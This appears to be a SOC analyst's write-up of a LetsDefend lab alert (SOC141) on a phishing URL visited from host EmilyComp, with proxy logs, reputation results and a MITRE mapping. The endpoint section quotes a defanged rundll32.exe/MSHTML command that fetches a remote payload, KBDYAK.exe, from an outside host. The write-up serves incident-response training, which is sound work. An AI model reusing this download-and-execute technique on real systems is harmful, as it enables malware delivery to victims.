# Phishing URL Detected

## 1. Alert Summary

| Field | Value |
|---|---|
| Event ID | 86 |
| Detection Rule | SOC141 - Phishing URL Detected |
| Event Time | 2021-03-22 21:23 |
| Severity | High |
| Category | Phishing |
| User | ellie |
| Hostname | EmilyComp |
| Source IP | 172.16.17.49 |
| Destination IP | 91.189.114.8 |
| Destination Domain | mogagrocol.ru |
| Device Action | Allowed |
| Investigation Verdict | True Positive |

## 2. Investigation Overview

An alert was generated after the user `ellie` accessed a suspicious URL from the endpoint `EmilyComp`.

Proxy analysis confirmed communication with the phishing domain. Subsequent endpoint investigation identified suspicious `rundll32.exe` activity using the MSHTML engine to retrieve a remote script.

The investigation therefore extended beyond URL reputation analysis to examine possible payload retrieval and endpoint impact.

## 3. Evidence Analysis

### URL and Domain Analysis

The observed request was:

```text
hxxp://mogagrocol[.]ru/wp-content/plugins/akismet/fv/index.php?email=ellie@letsdefend[.]io
```

VirusTotal reported:

| Indicator | Result |
|---|---|
| URL | 13/94 detections |
| Domain | 6/93 detections |
| Destination IP | 0/93 detections |

The domain and URL were classified as suspicious or phishing-related by reputation sources.

### Network Activity

Proxy logs confirmed the connection:

| Field | Value |
|---|---|
| Source IP | 172.16.17.49 |
| Destination IP | 91.189.114.8 |
| Destination Port | 80 |
| Protocol | HTTP |
| User | ellie |
| Host | EmilyComp |

The request was recorded as Allowed.

### Endpoint Activity

The investigation identified the following suspicious command:

```cmd
rundll32.exe javascript:..\mshtml,RunHTMLApplication document.write();GetObject("script:hxxp://ru-uid-507352920[.]pp[.]ru/KBDYAK.exe")
```

The command abused `rundll32.exe` and the MSHTML engine to retrieve a remote script.

The available endpoint evidence supports suspicious command execution and attempted payload retrieval. It does not independently establish successful execution of `KBDYAK.exe`.

### External References

- [Independent EventID 86 investigation](https://www.policytopackets.com/writeups/letsdefend/soc/141_86/)
- [SOC141 endpoint investigation](https://abby-exe.github.io/letsdefend/2026/02/27/soc141.html)

The independent endpoint investigation also describes Emotet-related activity associated with the suspicious URL and `rundll32.exe`.

## 4. MITRE ATT&CK Mapping

| Technique | Name | Supporting Evidence |
|---|---|---|
| T1204.001 | User Execution: Malicious Link | User accessed the phishing URL |
| T1218.011 | System Binary Proxy Execution: Rundll32 | `rundll32.exe` used with MSHTML |
| T1105 | Ingress Tool Transfer | Attempted retrieval of remote content |

## 5. Response Actions

- Reviewed the phishing URL and domain reputation.
- Correlated proxy logs with endpoint information.
- Examined the suspicious `rundll32.exe` command.
- Identified the remote payload URL.
- Collected the relevant domain, IP, and payload indicators.
- Recorded endpoint isolation and malicious infrastructure blocking in the original investigation notes.

Further forensic review is necessary to establish whether the retrieved payload completed execution.

## 6. Conclusion

The investigation confirmed a **True Positive** phishing URL incident involving access to `mogagrocol.ru` and suspicious `rundll32.exe` activity.

Endpoint evidence identified an attempted retrieval of `KBDYAK.exe` through the MSHTML engine. Successful execution of that payload was not independently established in the available material.

**Final Verdict: True Positive**

**Classification: Phishing URL / Suspicious Rundll32 Activity**
